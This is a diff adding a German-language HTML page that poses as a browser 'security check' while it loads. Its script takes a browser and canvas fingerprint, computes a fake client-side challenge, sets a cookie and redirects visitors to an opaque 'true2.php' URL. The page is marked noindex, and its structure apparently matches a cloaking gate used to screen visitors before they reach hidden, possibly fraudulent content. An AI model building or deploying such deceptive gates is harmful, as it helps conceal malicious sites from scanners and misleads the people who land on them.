@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Wird geladen...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:system-ui,-apple-system,sans-serif;
+  background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff
+}
+.loader{text-align:center;padding:2rem}
+.spinner{
+  width:60px;
+  height:60px;
+  margin:0 auto 1.5rem;
+  border:4px solid rgba(255,255,255,.3);
+  border-top:4px solid #fff;
+  border-radius:50%;
+  animation:spin 1s linear infinite
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+h1{font-size:1.5rem;font-weight:600;margin-bottom:.5rem;opacity:.95}
+p{font-size:.95rem;opacity:.85}
+noscript{
+  position:fixed;
+  top:0;left:0;right:0;
+  background:#dc2626;
+  color:#fff;
+  padding:1rem;
+  text-align:center;
+  font-weight:600
+}
+</style>
+</head>
+<body>
+<noscript>
+  <div>⚠️ JavaScript ist erforderlich. Bitte aktivieren Sie JavaScript in Ihrem Browser.</div>
+</noscript>
+
+<div class="loader">
+  <div class="spinner"></div>
+  <h1>Sicherheitsüberprüfung</h1>
+  <p>Einen Moment bitte...</p>
+</div>
+
+<script>
+(function() {
+  'use strict';
+  
+  // Browser-Fingerprinting (einfach)
+  const fp = {
+    screen: screen.width + 'x' + screen.height,
+    tz: new Date().getTimezoneOffset(),
+    lang: navigator.language || 'unknown',
+    platform: navigator.platform || 'unknown',
+    // Canvas-Fingerprint (sehr vereinfacht)
+    canvas: (function() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Browser', 2, 2);
+        return canvas.toDataURL().slice(-20);
+      } catch(e) { return 'err'; }
+    })()
+  };
+  
+  // Challenge lösen (einfache Math-Operation)
+  const challenge = "5e7a31dd";
+  const solved = btoa(challenge + fp.screen.slice(0,4));
+  
+  // Cookie setzen (JS-Challenge bestanden)
+  document.cookie = 'jsc=1; path=/; max-age=300; secure; samesite=lax';
+  
+  // Verzögerte Weiterleitung
+  setTimeout(function() {
+    // Fingerprint als versteckter Parameter mitgeben (optional für Logging)
+    const target = "\/true2.php?id=fre86xujymsoa2oy";
+    const sep = target.includes('?') ? '&' : '?';
+    window.location.href = target + sep + 'jsc=' + encodeURIComponent(solved);
+  }, 800);
+  
+  // Fallback: Falls Weiterleitung nicht klappt
+  setTimeout(function() {
+    document.querySelector('.loader p').textContent = 'Weiterleitung läuft...';
+  }, 600);
+})();
+</script>
+
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9d2e7fe44960271d',t:'MTc3MTkzMTI0OQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></html>
